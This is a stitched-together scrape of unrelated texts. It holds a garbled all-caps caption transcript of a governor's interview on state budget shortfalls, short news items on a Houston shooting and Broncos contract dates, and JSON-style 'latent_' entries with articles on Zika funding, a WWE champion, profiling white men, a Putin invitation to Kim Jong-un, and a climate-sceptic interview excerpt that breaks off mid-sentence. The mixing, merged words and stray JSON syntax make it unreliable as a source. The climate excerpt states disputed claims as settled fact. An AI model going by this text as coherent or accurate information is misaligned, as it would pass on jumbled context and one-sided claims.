LEGISLATURE THAT WE FIX A STRUCTURAL PROBLEMIN OUR BUDGET. IT IS NOT WORKING, IT IS BROKEN.IT'S BEEN THIS WAY FOR MANY DECADES. GOVERNOR KEATING TRIED TO DO THESAME THING. NOT THE FIRST GOVERNOR TO PROPOSE THAT WE HAVE A STRUCTURAL PROBLEM IN OUR BUDGET. AND THAT WE LOOK AT BROADENING OUR SALES TAX BASE ON CONSUMPTION OF GOODS BECAUSE OURTAXES -- THINGS WELL SELL, MORE SERVICE -- WE SELL MORE SERVICESTHAN GOODS. LOWER THE RATE, BRING MORE STABILITY TO THE SYSTEM. I ALSO TALKED ABOUT HOW WE COULDELIMINATE GROCERY SALES TAX. PEOPLE HAVE TO EAT. IT'S A CORE FUNCTION OF LIFE, GROCERIES AND FOOD. WE'D BE ABLE TO SAVE A FAMILY OFFOUR OVER $680. LOTS OF FIGURES OUT THERE. >> $680. >> FOR FAMILY OF FOUR. FOR A SINGLE PERSON, ABOUT $350.AND THEN WE TALKED ABOUT ELIMINATING THE CORPORATE INCOMETAX BECAUSE WE GET VERY LITTLE REVENUE. A LITTLE OVER $100 MILLION ON THAT. BUT IT'S VERY UNSTABLE BECAUSE COMPANIES CAN CARRY BACK AND FORWARD LOSSES FOR 15 YEARS. IT'S UNRELIABLE. I TALKED ABOUT A SALES TAX ON SERVICES BECAUSE POOR PEOPLE DON'T USE AS MANY SERVICES AS PEOPLE THAT HAVE MORE INCOME. >> THE TAX ON THE SERVICES, YOU KNOW, THAT'S YOUR PLAN OF ACTIONTHAT YOU HAVE KIND OF DELIVERED TO US HERE. IT'S BEEN MET WITH STIFF OPPOSITION TOO. LIEUTENANT GOVERNOR TOM LAMB RESIGNED FROM YOUR CABINET >> WHERE IS HIS PLAN?>> I HAVEN'T SEEN A PLAN. BUT STEPPED DOWN FROM YOUR CABINET BECAUSE OF THIS. DO YOU EXPECT YOUR PLAN TO COME TO FRUITION AND HAVE YOU SEEN THIS DIVISIVENESS?>> THERE ARE SOME THAT SUPPORT MY PLAN. THE OTHER PART, WE SHOULD LOOK AT SALES TAX EXEMPTIONS. WE EXEMPT 150 DIFFERENT ITEMS SPECIAL INTEREST LOBBY GROUPS HAVE COME TO THE CAPITOL AND SAID LET'S EXEMPT TATTOOS, LET'SEXEMPT CAR DETAILING, EXEMPT DIAPER SERVICE. PEOPLE WANT TO USE CLOTH DIAPERS. EXEMPT THOSE THINGS. THERE'S 150 ITEMS LIKE THAT. I CHALLENGED THE LEGISLATURE TO ALSO LOOK AT SALES TAX EXEMPTIONS AND WOULD YOU RATHER PAY TEACHERS, WOULD YOU RATHER HAVE HIGHER PATROLMEN ON THE HIGHWAYS, WOULD YOU RATHER HAVE FUNDS IN THE EMERGENCY MANAGEMENT AGENCY THAT TAKES CARE OF TORNADOES, WHICH HAS BEEN CUT BY 40%. I ALSO SAID WE NEED TO LOOK AT INCENTIVES SUCH AS PRODUCTION TAX INCENTIVES, SPECIAL INTERESTGROUPS SAID WE WANT INCENTIVES. SOME ARE VERY GOOD. MANY OF THEM CREATE JOBS, CREATEINVESTMENT. WE WANT TO KEEP THOSE THINGS SO WE CAN BE COMPETITIVE AS A STATEWITH OTHER STATES. BUT THERE'S A BROAD RANGE OF THINGS. I POUND THE TABLE AND SAY, HERE'S IDEAS FOR YOU. I PERFECTLY UNDERSTOOD THAT PEOPLE WOULDN'T TAKE MY BUDGET SALE AND PASS IT, LET'S GET IT DONE. BUT SOMEONE HAS TO START THE DISCUSSION. IF YOU DON'T PUT OUT ANY IDEAS, THAT'S NOT LEADERSHIP. >> YOU HAVE TO START SOMEWHERE. WANT TO TALK ABOUT THEFUND. >> ABSOLUTELY. >> NOW IT'S ESSENTIALLY BEEN DRAINED. WE'RE TALKING $240 MILLION. REPRESENTATIVE SCOTT INMAN SAID THEY WERE SURPRISED. >> THE TREASURER AND A.G. SAID IT'S LEGAL. >> DID YOU KNOW THE RAINY DAY FUND WOULD BE DRAINED?>> I DIDN'T KNOW THAT IT HAD BEEN -- THE MONEY HAD BEEN TAKENOUT. THE FACT OF THE MATTER IS, WHEN WE HAD A REVENUE FAILURE IN MARCH AND WE HAD TO CUT SPENDINGACROSS THE BOARD OF ALL AGENCIES, THERE ARE SOME AGENCIES LIKE DEPARTMENT OF HUMAN SERVICES THAT LAST YEAR THE LEGISLATURE ONLY APPROPRIATED 10 MONTHS OF OPERATION. IF WE WANT TO TAKE FOOD TO SENIORS AND ISSUES LIKE THAT, WEHAVE TO MAKE UP THAT MONEY, WHICH IS ABOUT $34 MILLION IN A SUPPLEMENTAL. FIND THE MONEY WITH THE REV FAILURES, IS TO BE ABLE TO TAKE IT OUT OF POCKETS OF MONEY THAT WE HAD. THAT'S WHAT A RAINY DAY ACCOUNT IS FOR. IT'S FOR HARD TIMES. BY LAW, THE RAINY DAY FUND HAS TO BE REFILLED AND AS WE ALL KNOW, APRIL 15 IS THE TAX DAY. SO AS PEOPLE PAY IN THEIR TAXES,THAT FUND WILL REPLENISH AND IT WILL BE PUT BACK IN THERE. BUT IT IS LEGAL, ACCORDING TO THE A.G. AND ACCORDING TO THE TREASURER. BACK TO THE RAINY DAY FUND. IN 2009, WE WENT THROUGH THE NATIONAL RECESSION, NATIONAL ECONOMY CRASHED. WHEN I CAME INTO OFFICE, WE WERESTILL GOING THROUGH THAT BIG CRASH. BY 2013, WE WERE ABLE TO BUILD UP A RAINY DAY ACCOUNT TO $530 MILLION IN SAVINGS, THANK GOD. BY 2014 -- WE HIT ANOTHER DOWNTURN. I'M GOING TO SHOW YOU TWO MORE CHARTS. >> REALLY QUICKLY. WE HAVE TO GET TO OTHER TOPICS. >> THIS CHART SHOWS THESE ARE THE AGENCIES THAT HAVE ALREADY HAD CUTS OVER THE PAST YEARS FROM 2009 WHEN WE HIT THE NATIONAL SESSION, GOVERNOR HENRYHAD TO A CUT A BILLION. THERE ARE AGENCIES THAT HAD 30% TO 40% CUTS. ON DOWN, THERE'S 10, 20 BELOW. SO KEY AGENCIES -- EMERGENCY MANAGEMENT HAD OVER 40% CUT. TOURISM DEPARTMENT, MANPOWER -->> ACROSS THE BOARD. >> YOU CAN SEE MANY CUTS. THE LAST GRAPH I WANT TO SHOW YOU IS THAT, WITH THE $900 MILLION SHORTFALL, IF WE DON'T INVEST IN OUR STATE AND FUND EDUCATION, FUND TEACHERS, FUND CORRECTIONS, PUBLIC SAFETY,ROADS AND BRIDGES, IF WE KEPT -OUR STATE AGENCIES TOP PRIORITIES OF OUR STATE EDUCATION, HUMAN SERVICES, MENTAL HEALTH, ONE MORE -- INCH THAT UP A LITTLE BIT ON THE SCREEN. IF WE -- TRANSPORTATION. IF WE KEPT THOSE FLAT AND HAD NOMORE CUTS -- HIGHER EDUCATION HAD 16% CUT LAST YEAR. KEPT IT ALL FLAT, YOU WOULD HAVETO CUT ON THAT CHART ALL AGENCIES BELOW US -- SHOW THE CHART ONE MORE TIME. YOU'D HAVE TO CUT THE DIFFERENT AGENCIES TO ZERO. THERE'S 60. THAT'S EVEN THE HOUSE, THE SENATE, THE GOVERNOR'S OFF. YOU WOULD STILL HAVE A $19 MILLION SHORTFALL. THE HOUSE IS ON FIRE. LET'S FIX THE BUDGET. MAKES TOUGH DECISIONS. >> YOU'VE CLEARLY THOUGHT ABOUT THIS. YOU'VE DELIVERED A PLAN. YOU BROUGHT THE GRAPHS. I DO OUT OF FAIRNESS WANT TO GETTO VIEWER QUESTIONS. A LOT OF PEOPLE CHIMED IN. THE FIRST ONE IS FROM ROB INTERESTED IN SPECIAL ELECTIONS.WE HAVE A COUPLE OF THEM THIS YEAR. WHY SHOULD THE TAXPAYERS HAVE TOPAY FOR A SPECIAL SESSION AS THEGOVERNOR HAS MENTIONED IF THE LEGISLATOR DOES NOT PASS A BUDGET?WHY DO THEY STILL GET PAID FOR NOT DOING THEIR JOB?>> I THINK THE LEGISLATURE WILL TRY SEND ME A BUDGET. THE QUESTION IS THERE THEY FUND EDUCATION, TRANSPORTATION, PUBLIC SAFETY, OR WILL THEY CUT THEM?THE OPTIONS I PRESENTED TO THE LEGISLATURE IS THERE'S THREE DIFFERENT BUDGETS. YOU CAN CUT SPENDING 14% ACROSS THE BOARD, WHICH IS ABOUT A $300 MILLION-PLUS CUT TO EDUCATION. HUGE CUTS TO PATROL, MENTAL HEALTH SERVICES, DEPARTMENT OF HUMAN SERVICES, ELDERLY. YOU CAN MAKE THOSE CUTS OR YOU CAN USE A COMBINATION OF GETTINGRID OF SOME OF OUR TAX INCENTIVES, TAX CREDITS, LOOKINGAT SALES TAX EXEMPTIONS. STILL MAKE -- CUTTING ABOUT 9%. WHICH WOULD BE TOUGH. OR YOU CAN LOOK AT BROADENING OUR SALES TAX BASE, A CONSUMPTION BASE, LOWERING THE BASE BECAUSE IT GENERATES MORE REVENUE. LOOK AT THE SALES TAX EXEMPTION,LOOK AT THE INCENTIVES, OFF-THE-TOP MONEY GOING TO DIFFERENT THINGS. WE CAN CREATE A SOUND FINANCIAL BUDGET SO THAT WE DON'T HAVE ANYUPS AND DOWNS ALL THE TIME. >> KATE SENT ME A TWEET. HE SAID HOW DO WE FIX OUR PUBLICSCHOOL SYSTEM?WHERE HAS THE MONEY FROM THE LOTTERY GONE?WHY NOT USE LIKE TEXAS?>> ON THE LOTTERY, SAID IT WAS GOING TO BRING $300 MILLION TO $500 MILLION ESTIMATE. I THINK IT'S $60 MILLION THAT ITBRINGS IN. IT NEVER DID DO WHAT PEOPLE SAIDIT WAS GOING TO DO. EDUCATION IS A PRIORITY FOR US. WE HAVE BEEN TALKING ABOUT TEACHER PAY RAISES. I HAD MY SPEECH. BUT UNTIL WE FIX STRUCTURAL CHALLENGES, WE WON'T BE ABLE TO DO THINGS WE WANT TO DO THAT AREIMPORTANT. I HAVE SAID WE CAN'T HAVE FOUR-DAY SCHOOL WEEKS. WE HAVE TO HAVE FIVE-DAY. A BUSINESSMAN TOLD ME, I'D LOVE TO COME TO YOUR STATE. IT'S GREAT. YOU HAVE DONE ALL THE RIGHT THINGS. A GREAT PLACE TO LIVE, GREAT QUALITY OF LIFE. HE SAID, YOU'RE SO POOR, YOU ONLY TEACH YOUR KIDS FOUR DAYS AWEEK. I SAID, NO, THAT'S JUST IN RURALAREAS. BUT THE PERCEPTION IS OUT THERE.BACK TO THE SPECIAL SESSION -- WHAT I SAID WAS IF OUR LEGISLATURE DOESN'T FUND THE CORE SERVICES APPROPRIATELY, FIXOUR BUDGET, WE'RE NOT HAVING THESE UPS AND DOWNS AND UNCERTAINTY, WHICH IS HORRIBLE, I CAN CALL A CONCURRENT SPECIAL SESSION, WHICH MEANS YOU HAD A SPECIAL SESSION DURING SESSION AND IT SAVES MONEY -->> THIS ONE FROM MIKE BRADLEY. HE WANTS TO KNOW WHAT PLANS ARE BEING DISCUSSED TO DIVERSIFY REVENUE SO WE DON'T RELY ON OIL AND GAS SO MUCH?>> WE HAVE DONE A REALLY GOOD JOB OF DIVERSIFY OUR ECONOMY. DURING THE 1980s, I LOST MY JOB -- I WORKED FOR AN OIL COMPANY. THE STATE WENT THROUGH A HUGE DOWNTURN. THEY RAISED TAXES IN THE 1980s BECAUSE THE STATE WAS IN HORRIBLE SHAPE. LOOKING AT HOW WE STRUCTURE OUR TAX CODE, LOOKING AT THE DIFFERENT INDUSTRY, INCENTIVES THAT WE GIVE THEM, TWEAKING IT, WHICH WE ARE SEEING TWEAKING GOING ON IN THE WIND INDUSTRY. WE PASSED INCENTIVES. WE ARE NUMBER THREE IN NATION WITH WIND PRODUCTION. WE HAVEN'T SEEN THE FARM FAILURES, HAVEN'T SEEN THE BANK FAILURES LIKE WE HAVE IN THE 1980s. DIVERSIFY OUR ECONOMY, BUT WE'VEGOT TO DO MORE. >> MORE WORK TO BE DONE. 2018 IS A BIG YEAR. WE HAVE TALKED TO MICK CORNETT, TODD LAMB, HINTING AT A POSSIBILITY OF RUNNING. SCOTT INMAN SAID HE'S 95% IN AT THIS POINT. WHAT'S YOUR PREDICTION?ALSO, WHAT DOES THE FUTURE HOLD FOR YOU?>> MY HOPE IS THAT WE'LL BE ABLETO STRUCTURALLY FIX THE FOUNDATION OF OUR BUDGET SO THATWHENEVER THE NEXT GOVERNOR COMESIN IN 2018, THEY WON'T HAVE SOMEOF THE ISSUES I WAS LEFT WITH. THEY OUGHT TO PRAY TO GOD THAT IGET SOME OF THESE THINGS FIXED BECAUSE NEXT YEAR WILL BE EVEN WORSE. I HAVE TOLD THE LEGISLATURE IF WE DON'T FIX THESE THINGS THIS YEAR, NEXT YEAR, ELECTION YEAR, IT WILL BE EXTREMELY DIFFICULT FOR THE CANDIDATES AND THE CANDIDATES WILL HAVE TO PUT OUT A PLAN. >> DO YOU ENDORSE -->> I'M NOT GOING TO ENDORSE ANYBODY. I'M STILL GETTING PHONE CALLS EVERY DAY. I THINK THERE'S PROBABLY SIX OR SEVEN DIFFERENT PEOPLE AT THIS POINT. I THINK IT WILL BE A BIG RACE. A LOT OF GOOD CANDIDATES, GOOD PEOPLE RUNNING WITH GREAT EXPERIENCE. I'M ANXIOUS TO SEE THAT. AS FAR AS MY PLANS, I HOPE TO TAKE A VACATION >> DO YOU STAY IN THE POLITICAL SPOTLIGHT OR DOES IT SOUND NICE TO GO UNDER RADAR FOR A LITTLE BIT?>> I BELIEVE IN LETTING WHOEVER THE NEXT GOVERNOR IS IMPLEMENT THEIR PLAN AND THE OTHER ELECTEDOFFICIALS. BUT IN 2018 YOU'LL SEE THE ELECTED OFFICIALS WILL BE LEAVING BECAUSE OF TERM LIMITS. THE LIEUTENANT GOVERNOR, THE GOVERNOR, THE TREASURER, AUDITOR.IT WILL BE A HUGE CHANGEOVER. IT GIVES ME A LITTLE BIT PAUSE BECAUSE YOU'LL HAVE ALL NEW TALENT WITH NOT A LOT OF HISTORYOF KNOWING WHAT'S WORKED, WHAT'SNOT WORKED. IT WILL BE A CHALLENGING TIME FOR THE STATE. EVEN HAVING 45 NEW LEGISLATORS OR SO THIS YEAR HAS BEEN A LITTLE BIT OF A CHALLENGE TRYINGTO GET THEM UP TO SPEED. BUT WE'VE GOT A GREAT NEW FRESHMAN CLASS.",

Nathan Desai, a local lawyer, has been connected to the attack.\n\nThe suspected attacker was killed in a shootout with police. The report from KRPC2 cited \"two law enforcement sources\" who said the man was \"wearing a Nazi uniform when he was killed during a confrontation with police.\" A tweet from Jace Larson of KPRC2 said more Nazi paraphernalia was found at the man's home.\n\nThree of the nine victims in the shooting have reportedly been released from the hospital, while one remains in critical condition.\n\nDesai's vehicle had been connected to the shooting, which took place in the early hours at a shopping center in southwest Houston. Local station KTRK reported that the vehicle was filled with weapons.\n\nDesai's father said the lawyer was troubled by a downturn at his law office and that he had not heard from his son after leaving him voicemails following the shooting. His father said his son lives near the shooting and that he drives a black Porsche like the one near the scene. Desai's law firm partner told KTRK it dissolved six months ago.\n\nA number of high-profile Texans have commented on the shooting. \"As victims of the Houston shooting fight for their lives this morning, Cecilia and I ask that all Texans join us in keeping them in your thoughts and prayers,\" said Gov. Greg Abbott in a statement. \"Our hearts go out to the victims’ families and we wish them all a full and speedy recovery.

If the Broncos do choose to use the tag on Miller, they will have until Friday, July 15 to work out a long-term extension.\n\nWhen GM John Elway said that QB Peyton Manning has \"all the time in the world\" to mull his potential retirement (or return to football), Elway really meant that Manning has until March 9 at 2pm, at which point the 2016 league year will begin, and Manning's $19M 2016 salary will be guaranteed.\n\nTwo days prior, on March 7, teams can begin negotiating with the agents of unrestricted free agents, although contracts cannot be finalized until after 2pm on March 9.

  "latent_24807": "WASHINGTON/LONDON (Reuters) - President Barack Obama will ask the U.S. Congress for more than $1.8 billion in emergency funds to fight Zika at home and abroad and pursue a vaccine, the White House said on Monday, but he added there is no reason to panic over the mosquito-borne virus.\n\nAnthony Fauci (R), director of the National Institute for Allergy and Infectious Disease and Anne Schuchat of the U.S. Centers for Disease Control and Prevention speak with reporters during a press briefing about the Zika virus at the White House in Washington February 8, 2016. REUTERS/Kevin Lamarque\n\nZika, spreading rapidly in South and Central America and the Caribbean, has been linked to severe birth defects in Brazil, and public health officials’ concern is focused on pregnant women and women who may become pregnant.\n\nObama’s request to Congress includes $200 million for research, development and commercialization of new vaccines and diagnostic tests for the virus.\n\nAt least 12 groups are working to develop a vaccine. On Monday, the London-based European Medicines Agency (EMA), Europe’s drugs regulator, said it established an expert task force to advise companies working on Zika vaccines and medicines, mirroring similar action during the two-year-long Ebola epidemic that started in December 2013 and the pandemic flu outbreak in 2009.\n\nThere are no vaccines or treatment for Zika and none even undergoing clinical studies. Most infected people either have no symptoms or develop mild ones like fever and skin rashes.\n\n“The good news is this is not like Ebola; people don’t die of Zika. A lot of people get it and don’t even know that they have it,” Obama told CBS News in an interview aired on Monday. “But there shouldn’t be panic on this. This is not something where people are going to die from it. It is something we have to take seriously.”\n\nMost of the money sought by Obama, who faces pressure from Republicans and some fellow Democrats to act decisively on Zika, would be spent in the United States on testing, surveillance and response in affected areas, including the creation of rapid-response teams to contain outbreak clusters.\n\nAt a White House briefing, Dr. Anne Schuchat, principal deputy director of the U.S. Centers for Disease Control and Prevention, said she was not expecting “large-scale amounts of serious Zika infections” in the continental United States as warmer months bring larger and more active mosquito populations.\n\n“We do think it’s likely that we will have limited local transmission in some of the southern states,” Schuchat said.\n\nObama’s funding request to Congress includes $335 million for the U.S. Agency for International Development to support mosquito-control, maternal health and other Zika-related public health efforts in affected countries in the Americas.\n\nDr. Anthony Fauci, director of the U.S. National Institute of Allergy and Infectious Diseases, told the White House briefing a vaccine likely would not be widely available “for a few years.”\n\nFauci said he anticipated beginning a so-called Phase 1 trial this summer for a Zika vaccine that would take about three months to test if it is safe and induces a good immune response before further studies can be conducted.\n\nThe CDC said its Zika emergency operations center, with a staff of 300, has been placed on its highest level of activation, reflecting a need for accelerated preparedness for possible local virus transmission by mosquitoes in the continental United States.\n\nSome lawmakers have urged Obama to name a Zika “czar” to head U.S. efforts against the virus, but Fauci said he sees no need right now for such an appointment.\n\nMICROCEPHALY CONCERNS\n\nMuch remains unknown about Zika, including whether the virus actually causes microcephaly, a condition marked by abnormally small head size that can result in developmental problems.\n\nBrazil is investigating the potential link between Zika infections and more than 4,000 suspected cases of microcephaly. Researchers have identified evidence of Zika infection in 17 of these cases, either in the baby or in the mother, but have not confirmed that Zika can cause microcephaly.\n\nWord that Zika can be spread by sexual transmission and blood transfusions and its discovery in saliva and urine of infected people have added to concern over the virus.\n\nThe World Health Organization declared the outbreak an international health emergency on Feb. 1, citing a “strongly suspected” relationship between Zika infection in pregnancy to microcephaly.\n\nBrazil is grappling with the virus even as it prepares to host the Olympic Games in Rio de Janeiro in August, with tens of thousands of athletes and tourists anticipated.\n\nThe U.S. Olympic Committee has told U.S. sports federations that athletes and staff concerned about their health due to Zika should consider not going to the Olympics.\n\nThe message was delivered in a conference call involving USOC officials and leaders of U.S. sports federations in late January.\n\nSlideshow (4 Images)\n\nFormer Olympian Donald Anthony, president and board chairman of USA Fencing, said, “One of the things that they immediately said was, especially for women that may be pregnant or even thinking of getting pregnant, that whether you are scheduled to go to Rio or no, that you shouldn’t go.”\n\nAt the White House, Fauci said athletes would need to make a personal decision about whether or not to skip the Olympics.",
  "latent_24836": "At NXT TakeOver: Chicago, Pete Dunne and Tyler Bate put on a show as they showcased the potential of the WWE's U.K. division. Dunne emerged victorious in a match that told an amazing story between two competitors who have been thrust into the wrestling spotlight in a hurry. Now, with the title in his possession, Dunne is ready for everything that comes next.\n\n\"I've completed every goal I've wanted and more at the age of 23,\" Dunne told ESPN.com moments after his victory. \"That doesn't mean I'm going to stop there at all. There's a lot more goals on the horizon.\"\n\nThere is plenty ahead for Dunne, but Saturday postmatch offered a moment of reflection. The bout was highly praised by the Chicago crowd, which chanted \"U.K.\" and \"Fight forever\" repeatedly, but it was the response Dunne received backstage after the match that really moved the new champion.\n\n\"It was quite overwhelming to be honest,\" said Dunne. \"I didn't expect it from the get-go, really. I'd be confident that any venue in the U.K., that there would be a fair amount of people that know who myself and Tyler are. It's another thing to walk out in Chicago and get a great reception. And then to walk back to an even more overwhelming reception from the people in the back, the people that have been around the business for so long and all the great ones behind it all. It's unbelievable.\"\n\nWith plans for the WWE to begin a weekly U.K. program in the near future on par with what they've done with NXT and 205 Live, it's the perfect time for the division to gain more exposure. Dunne is extremely proud of the direction it's heading, especially after a performance like his match at TakeOver.\n\n\"I'm just really proud of where we're taking this U.K. division,\" he said. \"Right now, we're still unsure of what it's going to become, but every time we put on a performance, we set out to kill it.\"\n\nAs the WWE moves toward that realization, Dunne is ready to lead the movement as the division's champion.\n\n\"I'm really honored to be pushing this U.K. brand.,\" he said. \"And now arguably being the face of it, it's a massive honor to me, because I saw British wrestling in the absolute pits at one point. Thirty or 40 people was a great draw. And now thanks to the exposure that the WWE has given us, and now in every house in the U.K., all the talents that come through, they all finally have something to work towards. And if I could be that benchmark for the talents to work towards, that's incredibly exciting to me, and it feels like a massive goal finally reached.\"\n\nAnother face of the division is former champion Bate, and while their match in Chicago vaulted them into the spotlight, the result was no surprise to either of the two participants, given that they know each other so well.\n\n\"[Tyler is] one of my two favorite people to wrestle [the other being fellow U.K. performer Mark Andrews] and I'm really glad I got to share that one with him,\" said Dunne. \"I had a big hand in training Tyler. I got him his first ever booking, which was against me in a tag match. As proud as I am of myself for being able to hold this WWE title, I was incredibly proud of him, as well. The two Brits on such a huge show of this magnitude.\"\n\nWhile wrestling fans aren't likely to complain about watching an endless amount of Dunne-Bate matches, Dunne offered up some other dream matches of his own.\n\n\"I'd love to wrestle Brock Lesnar,\" said Dunne. \"It's the realism, the way he carries himself. It's 100 percent believable because he's real. That's someone who I'd love to get in the ring with someday. I don't think there's a possibility of it ever happening, but I'd also love to wrestle William Regal one day.\"\n\nA match against Regal does seem unlikely, but Dunne's next goal isn't.\n\n\"One of [my remaining goals] is WrestleMania,\" said Dunne. \"That was a goal that I never really thought was doable, whereas now, it feels like it's on the horizon. It feels like it's something I could do in the next few years, for sure.\"",
  "latent_24847": "Time to profile white men? My interview with MSNBC ignites a conservative media firestorm -- and exposes America's dangerous double standard\n\nYesterday, during a cable news discussion of gun violence and the Newtown school shooting, I dared mention a taboo truism. During a conversation on MSNBC's \"Up With Chris Hayes,\" I said that because most of the mass shootings in America come at the hands of white men, there would likely be political opposition to initiatives that propose to use those facts to profile the demographic group to which these killers belong. I suggested that's the case because as opposed to people of color or, say, Muslims, white men as a subgroup are in such a privileged position in our society that they are the one group that our political system avoids demographically profiling or analytically aggregating in any real way. Indeed, unlike other demographic, white guys as a group are never thought to be an acceptable topic for any kind of critical discussion whatsoever, even when there is ample reason to open up such a discussion.\n\nMy comment was in response to U.S. Rep. James Langevin (D) floating the idea of employing the Secret Service for such profiling, and I theorized that because the profiling would inherently target white guys, the political response to such an idea might be similar to the Republican response to the 2009 Homeland Security report looking, in part, at the threat of right-wing terrorism. As you might recall, the same GOP that openly supports profiling -- and demonizing -- Muslims essentially claimed that the DHS report was unacceptable because its focus on white male terrorist groups allegedly stereotyped (read: offensively profiled) conservatives.\n\nAdvertisement:\n\nFor making this point, I quickly became the day's villain in the right-wing media. From the Daily Caller, to Fox News, to Breitbart, to Glenn Beck's the Blaze, to all the right-wing blogs and Twitter feeds that echo those outlets' agitprop, I was attacked for \"injecting divisive racial politics\" into the post-Newtown discussion (this is a particularly ironic attack coming from Breitbart - the same website that manufactured the Shirley Sherrod fiasco).\n\nThe conservative response to my statement, though, is the real news here.\n\nLet's review: Any honest observer should be able to admit that if the gunmen in these mass shootings mostly had, say, Muslim names or were mostly, say, African-American men, the country right now wouldn't be confused about the causes of the violence, and wouldn't be asking broad questions. There would probably be few queries or calls for reflection, and mostly definitive declarations blaming the bloodshed squarely on Islamic fundamentalism or black nationalism, respectively. Additionally, we would almost certainly hear demands that the government intensify the extant profiling systems already aimed at those groups.\n\nYet, because the the perpetrators in question in these shootings are white men and not ethnic or religious minorities, nobody is talking about demographic profiling them as a group. The discussion, instead, revolves around everything from gun control, to mental health services, to violence in entertainment -- everything, that is, except trying to understanding why the composite of these killers is so similar across so many different massacres. This, even though there are plenty of reasons for that topic to be at least a part of the conversation.\n\nRecounting the truth of these double standards is, of course, boringly mundane, which means my comment on television summarizing them is an equally boring and mundane statement of the obvious. However, as evidenced by the aggressive attempt to turn those comments into controversial headline-grabbing news over the weekend, the conservative movement has exposed its desperation -- specifically, its desperation to preserve its White Victimization Mythology.\n\nIn this mythology, the white man as a single demographic subgroup can never be seen as a perpetrator and must always be portrayed as the unfairly persecuted scapegoat. In this mythology, to even reference an undeniable truth about how white privilege operates on a political level (in this case, to prevent a government profiling system of potential security threats even though such a system exists for other groups) is to be guilty of both \"injecting divisive racial politics\" and somehow painting one's \"opponents as racist\" -- even when nobody called any individual a racist.\n\nAdvertisement:\n\nIn this mythology, in short, to mention truths about societal double standards -- truths that are inconvenient or embarrassing to white people -- is to be targeted for attack by the right-wing media machine.\n\nOf course, just as I didn't make such an argument yesterday on MSNBC, I'm not right now arguing for a system of demographically profiling white guys as a means of stopping mass murderers (that's right, the headline at Beck's website, the Blaze, is categorically lying by insisting I did make such an argument, when the MSNBC video proves that's not even close to true). After all, broad demographic profiling is not only grotesquely bigoted in how it unduly stereotypes whole groups, it also doesn't actually work as a security measure and runs the risk of becoming yet another Big Brother-ish monster (this is especially true when a lawmaker is forwarding the idea of deploying a quasi-military apparatus like the Secret Service).\n\nAdditionally, I'm not saying we should avoid the complex discussion about myriad issues (gun control, mental health, violence in Hollywood products, etc.) that we are having in the aftermath of the Connecticut tragedy. On the contrary, I believe it is good news that those nuanced conversations -- rather than simplistic calls for punitive measures against a demographic group -- are able to happen, and it's particularly good news that they are persisting in the face of pro-gun extremists' best effort to polarize the conversation.\n\nBut the point here is that those tempered and nuanced conversations are only able to happen because the demographic at the center of it all is white guys. That is the one group in America that gets to avoid being referred to in aggregate negative terms (and gets to avoid being unduly profiled by this nation's security apparatus), which means we are defaulting to a much more dispassionate and sane conversation -- one that treats the perpetrators as deranged individuals, rather than typical and thus stereotype-justifying representatives of an entire demographic.\n\nAdvertisement:\n\nWhile such fair treatment should be the norm for all citizens, the double standard at work makes clear it is still a special privilege for a select white few. That's the issue at the heart of my comment on MSNBC -- and it is a pressing problem no matter how much the conservative media machine wants to pretend it isn't.",
  "latent_24867": "MOSCOW (Yonhap) — Russian President Vladimir Putin has invited North Korean leader Kim Jong-un to Moscow next year, a news report said Friday, in what would be the first overseas trip by Kim.\n\n“It is true that such an invitation has been sent,” Russian state news agency TASS said, citing Russian presidential spokesman Dmitry Peskov.\n\nThe invitation is timed for the 70th anniversary of the former Soviet Union’s victory over Nazi Germany.\n\nStill, it remains unclear whether Kim will visit Moscow for the annual celebration that falls on May 9 as other foreign leaders could attend it.\n\nKim has never visited a foreign country since he inherited power upon the death of his father and long-time leader Kim Jong-il in 2011.\n\nThe report came a month after Kim’s special envoy, Choe Ryong-hae, visited Moscow and met with Putin.\n\nInformed sources said Putin invited Choe to visit Moscow in November. They did not elaborate and asked not to be identified, citing policy.\n\nChoe’s visit came at a time when Pyongyang was struggling to find a diplomatic exit amid growing international pressure over its alleged dismal human rights record.\n\nOn Thursday, the U.N. General Assembly formally adopted a landmark resolution calling for referring North Korea to the International Criminal Court for human rights violations.\n\nStill, chances of an actual referral are slim because General Assembly resolutions, unlike U.N. Security Council resolutions, are not legally binding. The Security Council is expected to take up the issue as early as next week, but is unlikely to approve a referral as China and Russia — two veto-wielding powers of the council’s five permanent members — are sure to veto it.",
  "latent_24898": "William Happer is the Cyrus Fogg Brackett Professor of Physics, Emeritus, in the Department of Physics at Princeton University. A long-time member of JASON, a group of scientists which provides independent advice to the U.S. government on matters relating to science, technology, and national security, Happer served as Director of the U.S. Department of Energy’s Office of Science from 1991–1993.\n\nBest known to the general public as a vocal critic of the U.N. IPCC “consensus” on global warming, he has been called frequently to give expert testimony before various U.S. congressional committees on the subject of global warming (climate change). In 2015, he found himself at the center of a new controversy involving a so-called “sting” operation organized by Greenpeace.\n\nA list of some of Professor Happer’s major research publications may be accessed here.\n\nThese excerpts have been taken from the interview, and appear here without quotes. (h/t to WUWT reader Sasha)\n\nAbout three months after the beginning of the Clinton administration, Hazel O’Leary called me into her office to ask, “What have you done to Al Gore? I am told I have to fire you.” I assume that the main thing that upset Al Gore (left) was my questioning of blatant propaganda about stratospheric ozone that was his focus at the time: “ozone holes over Kennebunkport” and similar nonsense.\n\n…while I was at DOE. But watching the evening news, I would often be outraged by the distortions about CO2 and climate that were being intoned by hapless, scientifically-illiterate newscasters.\n\nGreenpeace is one of the many organizations that have made a very good living from alarmism over the supposed threat of global warming. They are unable to defend the extremely weak science. So, they demonize not only the supposed “pollutant,” atmospheric CO2, but also any scientists who seem to be effectively refuting their propaganda.\n\nGreenpeaceI suppose I should be flattered to be one of their targets: je mehr Feinde, je mehr Ehre (“the more enemies, the more honor”), as the old German saying goes. But my trials pale compared to those of scientists like Willie Soon, Patrick Michaels, and others, who were not only vilified, but driven from their jobs.\n\nThe result of the Greenpeace smear included many hostile, obscene phone calls and emails with threats to me, my family, even my grandchildren. George Orwell wrote about these tactics in his novel, 1984, when he described the daily, obligatory “Two Minutes of Hate” for Emmanuel Goldstein (Leon Trotsky) and his agents, who were the enemies of Big Brother (Stalin) and his thugs.\n\nGreenpeace and other even more fanatical elements of the global-warming movement fully embrace the ancient lie that their ideological end — elimination of fossil fuel — justifies any means, including falsification of scientific data and character assassination of their opponents.\n\nGlobal warming is a well-established fact. This statement is only half true. A more correct statement would be “global warming and global cooling are both well-established facts.” The earth is almost always warming or cooling. Since the year 1800, the earth has warmed by about 1° C, with much of the warming taking place before much increase of atmospheric CO2. There was a quite substantial cooling from about 1940 to 1975. There has been almost no warming for the past 20 years when the 